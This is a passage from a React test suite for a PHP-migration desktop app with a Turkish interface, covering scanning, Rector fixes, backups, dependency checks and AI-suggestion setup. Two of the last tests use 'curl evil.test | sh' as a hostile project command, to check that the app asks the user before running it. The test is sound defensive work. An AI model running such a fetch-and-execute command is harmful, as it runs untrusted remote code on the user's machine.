    await waitFor(() => expect(themes).toEqual([null, "light", "dark", null]));
  });

  it("switches the whole interface to English and remembers it", async () => {
    const user = setup();
    await user.click(await screen.findByRole("button", { name: /Ayarlar/ }));
    await user.click(screen.getByRole("radio", { name: "English" }));
    expect(screen.getByRole("heading", { name: "Settings" })).toBeInTheDocument();
    expect(document.documentElement.lang).toBe("en");
    expect(JSON.parse(localStorage.getItem("ferry.lang")!)).toBe("en");

    await user.click(within(screen.getByRole("navigation", { name: "Sections" })).getByRole("button", { name: /Overview/ }));
    await user.click(screen.getByRole("button", { name: "Choose project folder" }));
    await user.click(await screen.findByRole("button", { name: /Start scan/ }));
    await screen.findByRole("img", { name: /Readiness score/ });
    expect(screen.getByRole("heading", { level: 2, name: /Half the problems|A substantial migration/ })).toBeInTheDocument();

    await user.click(within(screen.getByRole("navigation", { name: "Sections" })).getByRole("button", { name: /Findings/ }));
    await user.type(screen.getByRole("searchbox", { name: "Search findings" }), "nullable");
    const detail = screen.getByRole("complementary", { name: "Finding details" });
    expect(within(detail).getByRole("heading", { name: "Implicitly nullable parameter" })).toBeInTheDocument();
    expect(within(detail).getByText(/must be declared nullable/)).toBeInTheDocument();
  });

  it("does not leave scanning stuck when another project is opened mid-scan", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    api.scanProject = () => new Promise(() => {});
    render(<App api={api} />);
    await user.click(await screen.findByRole("button", { name: "Proje klasörü seçin" }));
    await user.click(await screen.findByRole("button", { name: /Taramayı başlat/ }));
    await screen.findByText(/uyumluluğu kontrol ediliyor/);
    await user.keyboard("{Meta>}o{/Meta}");
    await waitFor(() => expect(screen.getByRole("radio", { name: "8.4" })).toBeEnabled());
    expect(screen.getByRole("button", { name: /Taramayı başlat/ })).toBeEnabled();
  });

  it("stops a running preview without an error toast", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    let reject: (e: Error) => void = () => {};
    api.rectorPreview = () => new Promise((_, r) => (reject = r));
    api.cancelPreview = async () => reject(new Error("Rector durduruldu."));
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: /Önizlemeyi hazırla/ }));
    await user.click(await screen.findByRole("button", { name: /Durdur/ }));
    expect(await screen.findByRole("button", { name: /Önizlemeyi hazırla/ })).toBeEnabled();
    expect(screen.queryByText("Değişiklikler hesaplanamadı")).not.toBeInTheDocument();
  });

  it("cancels a running preview when the target changes", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    let cancels = 0;
    api.rectorPreview = () => new Promise(() => {});
    api.cancelPreview = async () => {
      cancels++;
    };
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: /Önizlemeyi hazırla/ }));
    await screen.findByRole("button", { name: /Durdur/ });
    const before = cancels;
    await user.click(nav(/Genel bakış/));
    await pickTarget(user, "8.3");
    expect(cancels).toBeGreaterThan(before);
  });

  it("warns before restoring files edited after the apply", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    api.snapshotConflicts = async () => [{ file: "includes/helpers.php", hash: "00ab" }];
    const restored: SnapshotConflict[][] = [];
    const real = api.restoreSnapshot;
    api.restoreSnapshot = (path, id, acknowledged) => {
      restored.push(acknowledged);
      return real(path, id, acknowledged);
    };
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Geçmiş/));
    const [row] = await backups();
    await user.click(within(row).getByRole("button", { name: "Geri al" }));
    const dialog = await screen.findByRole("dialog");
    expect(await within(dialog).findByText("Bu dosya uygulamadan sonra değiştirilmiş:")).toBeInTheDocument();
    expect(within(dialog).getByText("includes/helpers.php")).toBeInTheDocument();
    await user.click(within(dialog).getByRole("button", { name: "Geri al" }));
    expect(await screen.findByText("Geri yüklendi")).toBeInTheDocument();
    expect(restored).toEqual([[{ file: "includes/helpers.php", hash: "00ab" }]]);
  });

  it("closes the restore dialog without waiting for the rescan", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const real = api.scanProject;
    let scans = 0;
    api.scanProject = (...args) => (++scans === 1 ? real(...args) : new Promise(() => {}));
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Geçmiş/));
    const [row] = await backups();
    await user.click(within(row).getByRole("button", { name: "Geri al" }));
    await user.click(within(await screen.findByRole("dialog")).getByRole("button", { name: "Geri al" }));
    expect(await screen.findByText("Geri yüklendi")).toBeInTheDocument();
    await waitFor(() => expect(screen.queryByRole("dialog")).not.toBeInTheDocument());
    expect(scans).toBe(2);
  });

  it("deletes every snapshot of the project after confirming", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: /Önizlemeyi hazırla/ }));
    await user.click(await screen.findByRole("checkbox", { name: "Tümünü seç" }));
    await user.click(await screen.findByRole("button", { name: "Tümünü uygula" }));
    await user.click(within(await screen.findByRole("dialog")).getByRole("button", { name: "Uygula" }));
    await screen.findByText("4 dosya güncellendi");
    await user.click(nav(/Geçmiş/));
    await user.click(await screen.findByRole("button", { name: /Tümünü sil/ }));
    const dialog = await screen.findByRole("dialog");
    expect(within(dialog).getByRole("heading", { name: /yedeği silinsin mi/ })).toBeInTheDocument();
    await user.click(within(dialog).getByRole("button", { name: "Sil" }));
    expect(await screen.findByText("Henüz bir değişiklik uygulanmadı")).toBeInTheDocument();
  });

  it("keeps a running preview when the project is rescanned", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    let resolve: (p: Awaited<ReturnType<typeof api.rectorPreview>>) => void = () => {};
    const real = api.rectorPreview;
    api.rectorPreview = (...args) => new Promise((r) => (resolve = r)).then(() => real(...args));
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: /Önizlemeyi hazırla/ }));
    await user.click(nav(/Genel bakış/));
    await user.click(screen.getByRole("button", { name: /Tekrar tara/ }));
    await screen.findByRole("img", { name: /Hazırlık puanı/ });
    resolve(undefined as never);
    await user.click(nav(/Düzeltmeler/));
    expect(await screen.findByRole("list", { name: "Dosyalar" })).toBeInTheDocument();
  });

  it("focuses cancel first in destructive dialogs", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Geçmiş/));
    const [row] = await backups();
    await user.click(within(row).getByRole("button", { name: /Yedeği sil/ }));
    const dialog = await screen.findByRole("dialog");
    expect(within(dialog).getByRole("button", { name: "Vazgeç" })).toHaveFocus();
  });

  it("explains packages whose real PHP limit is lower than their constraint", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Bağımlılıklar/));
    const row = (await screen.findByText("illuminate/database")).closest("tr")!;
    expect(within(row).getByText("Bu sürüm resmi olarak en fazla PHP 8.1'i destekliyor.")).toBeInTheDocument();
    expect(within(row).getByText("Uyumsuz")).toBeInTheDocument();
  });

  it("limits the dependency counts and command to the packages shown", async () => {
    const user = setup();
    await openAndScan(user);
    await user.click(nav(/Bağımlılıklar/));
    const blocked = async () => (await screen.findByText("Uyumsuz paket")).nextElementSibling;
    expect(await blocked()).toHaveTextContent("3");
    expect(screen.getByText(/composer update .*phpunit\/phpunit/)).toBeInTheDocument();
    await user.click(screen.getByRole("switch", { name: "Yalnızca üretim" }));
    expect(await blocked()).toHaveTextContent("2");
    expect(screen.queryByText(/phpunit\/phpunit/)).not.toBeInTheDocument();
  });

  it("folds compatible packages behind a button", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const real = api.checkDependencies;
    api.checkDependencies = async (...args) => {
      const report = await real(...args);
      const extra = Array.from({ length: 6 }, (_, i) => ({ name: `acme/ok-${i}`, version: "1.0.0", phpConstraint: ">=7.0", status: "compatible" as const, dev: false }));
      return { ...report, packages: [...report.packages, ...extra] };
    };
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Bağımlılıklar/));
    const table = await screen.findByRole("region", { name: "Paketler" });
    expect(within(table).getByText("phpmailer/phpmailer")).toBeInTheDocument();
    expect(within(table).queryByText("acme/ok-5")).not.toBeInTheDocument();
    await user.click(within(table).getByRole("button", { name: /uyumlu paket daha/ }));
    expect(within(table).getByText("acme/ok-5")).toBeInTheDocument();
  });

  it("explains a composer constraint that blocks the target", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const real = api.checkDependencies;
    api.checkDependencies = async (...args) => ({ ...(await real(...args)), rootConstraint: ">=5.6 <8.0", rootStatus: "incompatible" });
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Bağımlılıklar/));
    const value = await screen.findByText(">=5.6 <8.0");
    expect(value.closest(".tip")).toHaveTextContent(/\^8\.4 olarak güncelleyin/);
  });

  it("names a conflict rule when composer.json sets no constraint", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const real = api.checkDependencies;
    api.checkDependencies = async (...args) => ({ ...(await real(...args)), rootConstraint: null, rootConflict: ">=8.0", rootStatus: "incompatible" });
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Bağımlılıklar/));
    expect(await screen.findByText(/conflict alanı \(php: >=8\.0\)/)).toBeInTheDocument();
  });

  it("does not call unconfirmed packages compatible", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const real = api.checkDependencies;
    api.checkDependencies = async (...args) => {
      const report = await real(...args);
      return { ...report, rootStatus: "compatible", packages: report.packages.filter((p) => p.status !== "incompatible") };
    };
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Bağımlılıklar/));
    expect(await screen.findByText(/Engel bulunmadı, ancak 1 paketin PHP 8.4 ile uyumu doğrulanamadı/)).toBeInTheDocument();
    expect(screen.queryByText(/hepsi PHP 8.4 ile uyumlu/)).not.toBeInTheDocument();
  });

  it("supports keyboard selection in the version picker", async () => {
    const user = setup();
    await user.click(await screen.findByRole("button", { name: "Proje klasörü seçin" }));
    const current = await screen.findByRole("radio", { name: "8.4" });
    current.focus();
    await user.keyboard("{ArrowRight}");
    expect(screen.getByRole("radio", { name: "8.5" })).toHaveAttribute("aria-checked", "true");
  });

  it("moves version files to the target without Rector, through the same backup", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const status = await api.toolchainStatus();
    api.toolchainStatus = async () => ({ ...status, php: null, rector: null });
    const apply = vi.spyOn(api, "applyChanges");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: "Sürüm dosyalarını güncelle" }));
    await user.click(await screen.findByRole("button", { name: "Önizlemeyi hazırla" }));
    await user.click(await screen.findByRole("button", { name: "Tümünü uygula" }));
    const dialog = await screen.findByRole("dialog");
    await user.click(within(dialog).getByRole("button", { name: /uygula/i }));
    await waitFor(() => expect(apply).toHaveBeenCalled());
    expect(apply.mock.calls[0][2]).toEqual(["Dockerfile"]);
    expect(apply.mock.calls[0][3]).toMatch(/^Sürüm dosyaları · PHP/);
    expect(await screen.findByText("Hepsi uygulandı")).toBeInTheDocument();
  });

  it("blocks applying on an uncommitted tree when the project asks for it", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0, config: { target: null, exclude: [], baseline: null, docker: { source: null, extensions: null, pages: null, dump: null, prepare: null, test: null }, git: { requireClean: true, branchPerBatch: false } } });
    api.gitStatus = async () => ({ repo: true, dirty: ["src/open.php"] });
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: "Önizlemeyi hazırla" }));
    await user.click(await screen.findByRole("button", { name: /uygula/ }));
    const dialog = await screen.findByRole("dialog");
    expect(await within(dialog).findByText("Projede commit edilmemiş 1 dosya var")).toBeInTheDocument();
    expect(within(dialog).getByRole("button", { name: "Uygula" })).toBeDisabled();
  });

  it("commits a batch on its own branch when asked", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0, config: { target: null, exclude: [], baseline: null, docker: { source: null, extensions: null, pages: null, dump: null, prepare: null, test: null }, git: { requireClean: false, branchPerBatch: true } } });
    const apply = vi.spyOn(api, "applyChanges");
    api.gitStatus = async () => ({ repo: true, dirty: [] });
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await user.click(await screen.findByRole("button", { name: "Önizlemeyi hazırla" }));
    await user.click(await screen.findByRole("button", { name: /uygula/ }));
    const dialog = await screen.findByRole("dialog");
    expect(within(dialog).getByRole("checkbox", { name: /Ayrı dal aç/ })).toBeChecked();
    await user.click(within(dialog).getByRole("button", { name: "Uygula" }));
    await waitFor(() => expect(apply).toHaveBeenCalled());
    expect(apply.mock.calls[0][5]).toMatch(/^PHP .* uyumluluğu/);
    expect(await screen.findByText(/dalına commit edildi \(abc1234\)/)).toBeInTheDocument();
  });

  it("moves up one PHP version at a time", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const preview = vi.spyOn(api, "rectorPreview");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    await pick(user, "Adım", /8\.0/);
    await user.click(screen.getByRole("button", { name: "Önizlemeyi hazırla" }));
    await waitFor(() => expect(preview).toHaveBeenCalled());
    expect(preview.mock.calls[0][1]).toBe("8.0");
    await user.click(await screen.findByRole("checkbox", { name: "Tümünü seç" }));
    await user.click(await screen.findByRole("button", { name: "Tümünü uygula" }));
    const dialog = await screen.findByRole("dialog");
    await user.click(within(dialog).getByRole("button", { name: "Uygula" }));
    await user.click(await screen.findByRole("button", { name: "PHP 8.1 adımına geç" }));
    await waitFor(() => expect(preview.mock.calls.at(-1)?.[1]).toBe("8.1"));
  });

  it("saves a custom editor command and asks for the file placeholder", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const save = vi.spyOn(api, "saveSettings");
    render(<App api={api} />);
    await user.click(await screen.findByRole("button", { name: /Ayarlar/ }));
    await pick(user, "Editör", "Özel komut");
    const field = await screen.findByRole("textbox", { name: "Komut ya da adres" });
    await user.type(field, "nvim +{{line}");
    expect(screen.getByText("Komutta {file} olmalı.")).toBeInTheDocument();
    await user.type(field, " {{file}");
    await user.tab();
    await waitFor(() => expect(save.mock.calls.at(-1)?.[0]).toMatchObject({ editor: "custom", editorCommand: "nvim +{line} {file}" }));
  });

  it("lists past checks in History", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    await more(user, /Sözdizimini/);
    await user.click(nav(/Geçmiş/));
    const card = (await screen.findByText("Son kontroller")).closest(".card") as HTMLElement;
    expect(within(card).getByText("Sözdizimi")).toBeInTheDocument();
    expect(within(card).getByText("Geçti")).toBeInTheDocument();
  });

  it("doesn't call the dependencies clear when the project's own constraint blocks", async () => {
    const user = userEvent.setup();
    const api = mockApi({
      delay: 0,
      deps: (d) => ({ ...d, rootStatus: "incompatible", rootConstraint: "^7.4", packages: d.packages.map((p) => ({ ...p, status: "unknown" as const })) }),
    });
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Bağımlılıklar/));
    expect(await screen.findByText(/uyumlu değil|uyumsuz/i)).toBeInTheDocument();
    expect(screen.queryByText(/Engel bulunmadı/)).not.toBeInTheDocument();
  });

  it("keeps a step picked before calculating", async () => {
    const user = userEvent.setup();
    render(<App api={mockApi({ delay: 0 })} />);
    await openAndScan(user);
    await user.click(nav(/Düzeltmeler/));
    const picker = await screen.findByRole("combobox", { name: "Adım" });
    await user.click(picker);
    const option = (await screen.findAllByRole("option")).find((o) => /düzeltmelerine kadar/.test(o.textContent ?? ""));
    if (!option) throw new Error("no step option");
    const chosen = option.textContent ?? "";
    await user.click(option);
    await user.click(nav(/Genel bakış/));
    await user.click(nav(/Düzeltmeler/));
    expect(await screen.findByRole("combobox", { name: "Adım" })).toHaveTextContent(chosen);
  });

  it("lets you stop pinning a target from the project settings", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0, config: { target: "8.3", exclude: [], baseline: null, docker: { source: null, extensions: null, pages: null, dump: null, prepare: null, test: null }, git: { requireClean: false, branchPerBatch: false } } });
    const save = vi.spyOn(api, "saveProjectConfig");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(await screen.findByRole("button", { name: /Ayarlar/ }));
    await user.click(await screen.findByRole("button", { name: "Hedef sabitlemesini kaldır" }));
    await user.click(screen.getByRole("button", { name: "Projeye kaydet" }));
    await waitFor(() => expect(save).toHaveBeenCalled());
    expect(save.mock.calls[0][1].target).toBeNull();
  });

  it("suggests a fix with AI only after consent and a look at what is sent", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const suggest = vi.spyOn(api, "aiSuggest");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    for (const option of await screen.findAllByRole("option")) {
      await user.click(option);
      if (screen.queryByRole("button", { name: "AI ile öner" })) break;
    }
    await user.click(screen.getByRole("button", { name: "AI ile öner" }));
    const sheet = await screen.findByRole("dialog", { name: "AI önerisi" });
    await user.click(await within(sheet).findByRole("button", { name: "Bu projede aç" }));
    expect(await within(sheet).findByText(/Yalnızca bu metin gönderilir/)).toBeInTheDocument();
    expect(suggest).not.toHaveBeenCalled();
    await user.click(within(sheet).getByRole("button", { name: "Gönder" }));
    await user.click(await within(sheet).findByRole("button", { name: "Uygula" }));
    await waitFor(async () => expect((await api.listSnapshots("")).some((b) => b.label.startsWith("AI önerisi"))).toBe(true));
    expect((await api.getSettings()).aiProjects).toHaveLength(1);
  });

  it("keeps the AI key out of everything but the keychain call", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0, aiProvider: null });
    const save = vi.spyOn(api, "saveAiConfig");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/AI önerileri/));
    await user.type(await screen.findByLabelText("API anahtarı"), "sk-ant-test");
    await user.click(screen.getByRole("button", { name: "Kaydet" }));
    await waitFor(() => expect(save).toHaveBeenCalledWith({ kind: "anthropic", model: "claude-opus-5-5", baseUrl: null }, "sk-ant-test"));
    expect(await screen.findByText("Anahtar sistemin anahtar zincirinde.")).toBeInTheDocument();
    await user.click(screen.getByRole("switch", { name: /kuzey-magaza projesinde AI önerileri/ }));
    await waitFor(async () => expect((await api.getSettings()).aiProjects).toHaveLength(1));
  });

  it("uses a local server it finds, without the key saved for another server", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0, localAi: [{ name: "Ollama", baseUrl: "http://127.0.0.1:11434/v1", models: ["qwen2.5-coder:7b", "qwen3:8b"] }] });
    await api.saveAiConfig({ kind: "openai", model: "gpt-5", baseUrl: "https://api.openai.com/v1" }, "sk-openai");
    const save = vi.spyOn(api, "saveAiConfig");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/AI önerileri/));
    expect(await screen.findByText("Ollama bu bilgisayarda çalışıyor. Kod bilgisayarınızdan çıkmaz.")).toBeInTheDocument();
    expect(screen.getByText("Anahtar sistemin anahtar zincirinde.")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Bunu kullan" }));
    await waitFor(() => expect(save).toHaveBeenCalledWith({ kind: "openai", model: "qwen2.5-coder:7b", baseUrl: "http://127.0.0.1:11434/v1" }, null));
    expect(await screen.findByRole("button", { name: "Kullanılıyor" })).toBeDisabled();
    expect(await screen.findByText("Açık: Ollama (qwen2.5-coder:7b)")).toBeInTheDocument();
    expect(screen.queryByText("Anahtar sistemin anahtar zincirinde.")).not.toBeInTheDocument();
  });

  it("installs the local model with progress, uses it and removes it", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 400 });
    const save = vi.spyOn(api, "saveAiConfig");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/AI önerileri/));
    await user.click(await screen.findByRole("button", { name: "İndir ve kur" }));
    expect(await screen.findByRole("progressbar")).toBeInTheDocument();
    expect(await screen.findByText("Model indiriliyor")).toBeInTheDocument();
    expect(await screen.findByText(/^[\d,]+ GB \/ 5,3 GB$/)).toBeInTheDocument();
    expect(await screen.findByText("Qwen3.5 9B kuruldu")).toBeInTheDocument();
    expect(await screen.findByText("Qwen3.5 9B bu bilgisayarda kurulu. Kod bilgisayarınızdan çıkmaz.")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Bunu kullan" }));
    await waitFor(() => expect(save).toHaveBeenCalledWith({ kind: "local", model: "qwen3.5-9b", baseUrl: null }, null));
    expect(await screen.findByText("Açık: Local model (Qwen3.5 9B)")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Kullanılıyor" })).toBeDisabled();

    await user.click(screen.getByRole("button", { name: "Modeli kaldır" }));
    const dialog = await screen.findByRole("dialog");
    expect(within(dialog).getByText(/yaklaşık 5,3 GB yer açılır/)).toBeInTheDocument();
    await user.click(within(dialog).getByRole("button", { name: "Modeli kaldır" }));
    expect(await screen.findByRole("button", { name: "İndir ve kur" })).toBeInTheDocument();
    await waitFor(() => expect(screen.queryByText(/Açık: Local model/)).not.toBeInTheDocument());
  });

  it("stops a local model download without calling it a failure", async () => {
    const user = userEvent.setup();
    render(<App api={mockApi({ delay: 200 })} />);
    await openAndScan(user);
    await user.click(nav(/AI önerileri/));
    await user.click(await screen.findByRole("button", { name: "İndir ve kur" }));
    await user.click(await screen.findByRole("button", { name: "Durdur" }));
    expect(await screen.findByRole("button", { name: "İndir ve kur" }, { timeout: 3000 })).toBeInTheDocument();
    expect(screen.queryByText("Yerel model kurulamadı")).not.toBeInTheDocument();
  });

  it("says when the computer is too small for a local model", async () => {
    const user = userEvent.setup();
    render(<App api={mockApi({ delay: 0, localModel: null })} />);
    await openAndScan(user);
    await user.click(nav(/AI önerileri/));
    expect(await screen.findByText(/belleği Ferry'nin yerel modeli için yetmiyor/)).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Yeniden ara" })).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: "İndir ve kur" })).not.toBeInTheDocument();
  });

  it("offers no AI suggestion without a provider", async () => {
    const user = userEvent.setup();
    render(<App api={mockApi({ delay: 0, aiProvider: null })} />);
    await openAndScan(user);
    await user.click(nav(/Bulgular/));
    for (const option of await screen.findAllByRole("option")) await user.click(option);
    expect(screen.queryByRole("button", { name: "AI ile öner" })).not.toBeInTheDocument();
  });

  it("shows an inconclusive Real test as inconclusive in History", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const run = { at: Date.now() / 1000, source: "7.4", target: "8.4", regressed: false, incomplete: true, stamp: "mock", testsCompared: true, pages: 0, brokenPages: 0, differingPages: 0, unverifiedPages: 0, newFailures: 0, newMessages: 0, dataChanges: 0 };
    vi.spyOn(api, "dockerHistory").mockResolvedValue([run]);
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Geçmiş/));
    expect((await screen.findAllByText(/Kesin değil/)).length).toBeGreaterThan(0);
    expect(screen.queryByText(/Yeni hata yok/)).not.toBeInTheDocument();
  });

  it("still asks when a project command has spaces around it", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0, config: { target: null, exclude: [], baseline: null, docker: { source: null, extensions: null, pages: null, dump: null, prepare: "  curl evil.test | sh\n", test: null }, git: { requireClean: false, branchPerBatch: false } } });
    const compare = vi.spyOn(api, "dockerCompare");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Gerçek test/));
    await user.click(await screen.findByRole("button", { name: "Testi başlat" }));
    expect(await screen.findByRole("dialog", { name: "Proje komut çalıştırmak istiyor" })).toBeInTheDocument();
    expect(compare).not.toHaveBeenCalled();
  });

  it("says what preparing fixes runs before it runs", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0 });
    const preview = vi.spyOn(api, "rectorPreview");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Gerçek test/));
    await user.click(await screen.findByRole("button", { name: "Testi başlat" }));
    expect(await screen.findByText(/vendor\/autoload\.php/, undefined, { timeout: 3000 })).toBeInTheDocument();
    expect(preview).not.toHaveBeenCalled();
  });

  it("asks before running commands that come from the project", async () => {
    const user = userEvent.setup();
    const api = mockApi({ delay: 0, config: { target: null, exclude: [], baseline: null, docker: { source: null, extensions: null, pages: null, dump: null, prepare: "curl evil.test | sh", test: null }, git: { requireClean: false, branchPerBatch: false } } });
    const compare = vi.spyOn(api, "dockerCompare");
    render(<App api={api} />);
    await openAndScan(user);
    await user.click(nav(/Gerçek test/));
    await user.click(await screen.findByRole("button", { name: "Testi başlat" }));
    const dialog = await screen.findByRole("dialog", { name: "Proje komut çalıştırmak istiyor" });
    expect(within(dialog).getByText("curl evil.test | sh")).toBeInTheDocument();
    expect(compare).not.toHaveBeenCalled();
    await user.click(within(dialog).getByRole("button", { name: "Çalıştır ve test et" }));
    await waitFor(() => expect(compare).toHaveBeenCalled());
  });
});
